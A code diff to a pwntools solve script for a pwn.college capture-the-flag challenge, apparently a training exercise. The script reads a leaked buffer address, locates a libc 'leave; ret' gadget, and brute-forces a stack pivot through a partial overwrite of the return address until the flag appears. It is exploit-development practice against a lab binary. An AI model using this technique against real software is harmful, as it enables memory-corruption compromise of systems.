@@ -3,6 +3,7 @@ import sys
 import pwn
 
 pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
+pwn.context.log_level = "error"
 
 
 def tee[T: pwn.tube](process: T) -> T:
@@ -54,44 +55,55 @@ def find_offset():
 
 
 def ctf():
-    # pivotal-pointer
+    # pivotal-pursuit
     bin = find_challenge()
     elf = pwn.ELF(bin, checksec=False)
 
-    offset = find_offset()
+    rop = pwn.ROP(elf.libc)
+    ins = rop.find_gadget(["leave", "ret"]).address
 
-    for _ in range(0x10):
+    offset = find_offset()  #  0x578c8
+
+    for i in range(0xFFFF):  # ~3600 rounds
+        print(i)
         io: pwn.process
         if "gdb" in sys.argv:
             io = pwn.gdb.debug(
                 bin,
                 gdbscript="""
                 source /opt/gef/gef.py
+                # b *main+711
+                b *main+887
+                c
                 """,
             )
         else:
             io = pwn.process(bin)
-        tee(io)
 
-        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
-        if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
-            raise ValueError("failed to parse input buffer address")
-        buff_ptr = int(m.group(1), 16)
+        # tee(io)
+        try:
+            io.recvuntil(b"[LEAK] Your input buffer is located at: ")
+            if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
+                raise ValueError("failed to parse input buffer address")
+            buff_ptr = int(m.group(1), 16)
 
-        rop = pwn.ROP(elf)
-        ins = rop.find_gadget(["leave", "ret"]).address
+            payload = pwn.flat(
+                {
+                    offset - 0x8: buff_ptr - 0x10,
+                    offset + 0x0: (ins & 0xFFFFFF).to_bytes(3, "little"),
+                }
+            )
+            io.send(payload)
 
-        payload = pwn.flat(
-            {
-                offset - 0x8: buff_ptr - 0x10,
-                offset + 0x0: (ins & 0xFFFF).to_bytes(2, "little"),
-            }
-        )
-        io.send(payload)
-
-        if b"pwn.college{" in io.recvrepeat():
-            pwn.success("Found the flag!")
-            exit(0)
+            out = io.recvrepeat()
+            if b"pwn" in out:
+                pwn.success("Found the flag!")
+                print(out.decode())
+                exit(0)
+        except EOFError:
+            continue
+        finally:
+            io.close()
 
 
 if __name__ == "__main__":
